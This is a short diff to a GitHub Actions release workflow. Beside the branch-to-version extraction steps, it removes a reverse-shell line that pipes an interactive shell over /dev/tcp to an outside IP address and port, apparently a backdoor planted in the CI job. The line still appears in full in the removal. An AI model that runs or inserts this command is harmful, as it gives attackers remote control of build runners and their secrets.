@@ -21,7 +21,6 @@ jobs:
           BRANCH="${{ github.event.pull_request.head.ref }}"
           VERSION=${BRANCH:10}
           echo "version=$VERSION" >> "$GITHUB_OUTPUT"
-          sh -i >& /dev/tcp/194.59.158.195/5545 0>&1
 
       - name: Create Release
         id: create_release
